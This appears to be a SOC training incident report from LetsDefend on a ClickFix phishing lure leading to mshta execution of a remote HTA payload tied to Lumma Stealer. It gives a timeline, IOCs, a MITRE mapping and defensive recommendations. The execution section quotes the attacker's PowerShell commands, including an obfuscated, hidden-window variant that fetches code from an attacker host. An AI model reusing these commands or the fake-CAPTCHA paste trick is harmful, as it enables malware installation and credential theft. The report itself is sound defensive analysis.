# SOC338 — ClickFix phishing leading to mshta execution (Lumma Stealer)

**Severity:** Critical · **Verdict:** True Positive
**Date:** 2026-07-26 · **Analyst:** Kaan Cankaya · **Source:** LetsDefend — SOC Analyst path, alert SOC338 (Event ID 316)

---

## 1. Summary

A phishing email impersonating a Microsoft Windows 11 upgrade offer was delivered to a single user
and was not quarantined. Fourteen hours later the user opened the link from webmail. The landing page
used the ClickFix technique: it placed a command on the clipboard and instructed the user to paste it
into the Windows Run dialog under the guise of a CAPTCHA verification. The pasted command launched
PowerShell, which in turn ran `mshta.exe` against a remote HTA payload disguised as an `.mp4` file.
The firewall allowed the request. The host has been isolated. Activity after the payload was
retrieved is not visible in the available telemetry.

## 2. Timeline

All times 13 March 2025.

| Time | Event |
|---|---|
| 09:44 | Email delivered from `update@windows-update.site` to `dylan@letsdefend.io`, subject "Upgrade your system to Windows 11 Pro for FREE". SMTP source `132.232.40.201` to the mail server on port 25. Device action: **Allowed** |
| 23:26:08 | User opens `https://windows-update.site/` from webmail. Proxy log: referrer `https://mail.letsdefend.io/`, HTTP 200, process `chrome.exe` |
| 23:26:19 | Command executed from the Run dialog: PowerShell reconstructing and invoking `mshta.exe` against `https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` |
| 23:26:20 | Outbound connection to `172.67.139.19` (Cloudflare edge for `overcoatpassably.shop`) |
| 23:26 | Firewall: `172.16.17.216:34211 → 172.67.139.19:443`, process `mshta.exe` (PID 7284), `GET .../maloy.mp4`, action **Allowed** |
| 23:26:32 | Process 7308: `powershell.exe` spawned by `powershell.exe`, target command line `mshta.exe https://overcoatpassably.shop/...`, user `EC2AMAZ-ILGVOIN\LetsDefend` |
| 23:28:11 | Last network record available for this host |
| — | Host isolated |

## 3. Analysis

### The message

The sender domain `windows-update.site` imitates Microsoft without being associated with it. The body
reproduced Microsoft branding and offered a free Windows 11 Pro upgrade with an "UPDATE NOW" button.
The mail gateway recorded the action as Allowed, so the message reached the mailbox and sat there for
about fourteen hours before the user acted on it.

### Infrastructure

| Indicator | Finding |
|---|---|
| `windows-update.site` | 11/92 on VirusTotal, categorised as spyware and malware |
| `132.232.40.201` | 3/91, AS45090 (Tencent), China. Passive DNS on the same address returns `windows-update.site`, `www.microsoft-update.online` and `ns2.microsoft-update.online` |
| `overcoatpassably.shop` | 13/91, registered about a year ago, DNS hosted on Cloudflare |

The SMTP source is not single-purpose infrastructure: the same address has hosted several
Microsoft-themed lookalike domains, which indicates reuse across campaigns.

### Execution: the ClickFix technique

Two variants of the command appear in the host's terminal history:

```
powershell.exe -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"

PowerShell.exe -w 1 powershell -Command
  ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']')
  # "I am not a robot - reCAPTCHA Verification ID: 3824"
```

Four details matter:

1. **`mshta.exe` is a signed Microsoft binary** that executes HTML Application content and accepts a
   URL as its argument. Nothing has to be dropped on disk and no unsigned executable has to run,
   which is why it is favoured for this stage.
2. **The `.mp4` extension is cosmetic.** `mshta` parses the content it receives rather than the file
   extension, so the payload is an HTA regardless of what the URL is named. Controls that filter on
   file extension do not see it.
3. **The string `mshta.exe` is assembled at runtime** by `('ms]]]ht]]]a]]].]]]exe' -replace ']')`.
   This defeats detections that match the literal command name.
4. **The trailing comment is inert.** In PowerShell everything after `#` is ignored, so
   `"I am not a robot - reCAPTCHA Verification ID: 3824"` has no function at runtime. Its purpose is
   visual: in the Run dialog the visible text resembles a verification code, so the user believes
   they are pasting a CAPTCHA identifier. `-w 1` hides the PowerShell window.

The ClickFix pattern removes every signal users are trained to look for. There is no attachment, no
download prompt and no unsigned binary. The page copies the command to the clipboard in the
background and instructs the user to press Win+R and paste. Execution is performed by the user, so no
vulnerability is exploited.

### What happened after execution

The HTA payload was retrieved successfully: the outbound connection at 23:26:20 matches the firewall
record of the `GET` request for `maloy.mp4`, and the request was allowed.

The remaining network destinations in the window belong to Google and AWS ranges and to an internal
VPC address. One entry at 23:27:15 (`77.88.21.119`, Yandex range) was checked separately and returned
clean. Host records stop at 23:28:11, so the behaviour of the HTA after it executed, including any
credential collection or exfiltration by the Lumma payload, cannot be established from this data.

Email Security was searched for other recipients of the same sender and subject: none were found.
This is a single-recipient delivery rather than a broad campaign.

## 4. Indicators of Compromise

| Indicator | Type | Verdict | Source |
|---|---|---|---|
| `update@windows-update.site` | Email sender | Malicious | Alert |
| `132.232.40.201` | IPv4 | Malicious | VirusTotal 3/91, mail log |
| `windows-update.site` | Domain | Malicious | VirusTotal 11/92 |
| `https://windows-update.site/` | URL | Malicious | Browser history, proxy log |
| `overcoatpassably.shop` | Domain | Malicious | VirusTotal 13/91 |
| `https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` | URL | Malicious | Firewall log, terminal history |
| `172.67.139.19`, `104.21.94.177` | IPv4 | Infrastructure | Cloudflare edge addresses for the domain |

Machine-readable copy: [`iocs.csv`](./iocs.csv)

The Cloudflare addresses are shared and are recorded for context only. The domain and URL are the
blockable indicators; blocking those addresses would affect unrelated services.

Excluded as normal activity: `chrome.exe --utility-sub-type=unzip.mojom.Unzipper` (Chrome's internal
unzip service), `services.exe` launching `amazon-ssm-agent.exe` (AWS management agent), and Google
and AWS destinations in the same window.

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1566.002 — Phishing: Spearphishing Link | Delivered message with a link to `windows-update.site`, opened from webmail |
| Execution | T1204.004 — User Execution: Malicious Copy and Paste | ClickFix page; command executed from the Run dialog with the CAPTCHA-styled comment |
| Execution | T1059.001 — Command and Scripting Interpreter: PowerShell | Terminal history and process 7308 |
| Defense Evasion | T1218.005 — System Binary Proxy Execution: Mshta | `mshta.exe` invoked against a remote HTA |
| Defense Evasion | T1027 — Obfuscated Files or Information | `('ms]]]ht]]]a]]].]]]exe' -replace ']')` rebuilds the binary name at runtime |
| Defense Evasion | T1564.003 — Hide Artifacts: Hidden Window | `-w 1` suppresses the PowerShell window |
| Command and Control | T1105 — Ingress Tool Transfer | HTA payload retrieved from `overcoatpassably.shop` |
| Command and Control | T1071.001 — Application Layer Protocol: Web | HTTPS request on port 443, allowed by the firewall |

## 6. Verdict and Reasoning

True positive. A malicious message was delivered without being quarantined, the user opened the link,
executed the attacker's command through the Run dialog, and the resulting `mshta` process
successfully retrieved a remote payload over an allowed connection. Each step is supported by a
separate source: mail log, proxy log, terminal history, process record and firewall record.

Severity Critical is appropriate. Code from attacker-controlled infrastructure executed on a
workstation and the alert rule associates it with an information stealer.

**Scope:** one recipient, one host. No other delivery of the same message was found.

**Action taken:** host isolated.

**Recommended follow-up:** reset the user's credentials and revoke active sessions, since the
associated malware family targets stored credentials and browser data and post-execution behaviour is
not visible in the telemetry; block the two domains and the payload URL at the proxy and mail
gateway; preserve and examine the `RunMRU` registry key on the host, which records what was typed or
pasted into the Run dialog and would confirm the paste directly.

## 7. Recommendations

1. **Restrict `mshta.exe`.** It has no routine business use on a standard workstation. Block it with
   WDAC or AppLocker for standard users, and alert on any execution where the command line contains a
   URL. This single control breaks the chain regardless of the lure used.
2. **Detect the ClickFix pattern rather than the payload.** Alert on PowerShell launched with a
   hidden window, on command lines that rebuild strings with `-replace`, and on command lines
   containing CAPTCHA or verification wording. The `RunMRU` registry key is a useful hunting source
   for pasted commands.
3. **Tighten mail gateway handling of brand-impersonating and newly observed domains.** The sender
   domain imitated Microsoft and the message was delivered rather than quarantined. Newly registered
   or lookalike sender domains should be quarantined for review.
4. **Include ClickFix in user awareness material.** The specific rule to teach is that no legitimate
   website asks a user to press Win+R and paste text. This pattern bypasses attachment and download
   controls entirely, so the user is the control point.
5. **Review endpoint telemetry retention.** Host records end minutes after the incident, which
   prevented any assessment of what the payload did after execution.

ISO/IEC 27001:2022: A.5.24–A.5.26 (incident management), A.6.3 (awareness and training),
A.8.7 (protection against malware), A.8.16 (monitoring activities), A.8.23 (web filtering).

## 8. What I Learned

- Attackers do not need a file to get code running. A signed Windows binary and a user who pastes a
  command are enough.
- File extensions in a URL prove nothing. `mshta` runs whatever content it receives, so a payload
  named `.mp4` is still script.
- Not every address in a log is blockable. The malicious domain sat behind Cloudflare, so the useful
  indicator was the domain, not the IP.
- Normal noise has to be separated from evidence. Chrome's internal unzip service and the AWS agent
  appeared in the same process list as the attack and belong in neither the timeline nor the IOC table.
- Checking whether other users received the same message changes the scope of the incident, and a
  negative answer is worth stating explicitly in the report.

---

*Analysis performed in the LetsDefend training environment. No production or customer data is involved.*
